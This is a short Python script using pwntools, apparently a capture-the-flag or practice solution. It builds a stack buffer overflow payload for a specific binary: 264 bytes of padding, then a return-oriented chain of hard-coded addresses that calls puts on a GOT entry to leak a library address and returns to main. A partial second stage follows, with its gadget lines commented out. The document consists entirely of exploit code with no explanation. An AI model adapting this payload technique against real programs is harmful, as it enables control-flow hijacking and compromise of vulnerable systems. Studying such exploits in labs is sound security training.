#!/usr/bin/python
from pwn import *

buff = ''
buff+= "A"*264
buff+= p64(0x4007f3) #pop rdi, ret
buff+= p64(0x601018) #puts@got
buff+= p64(0x400500) #puts@plt
buff+= p64(0x40064d) #main
buff+= "\n"
buff+= "B"*264
buff+= "CCCCCC"
#buff+= p64(0x4007f3) #pop rdi, ret
#buff+= p64(0x601018) #puts@got
#buff+= p64(0x400500) #puts@plt

print buff
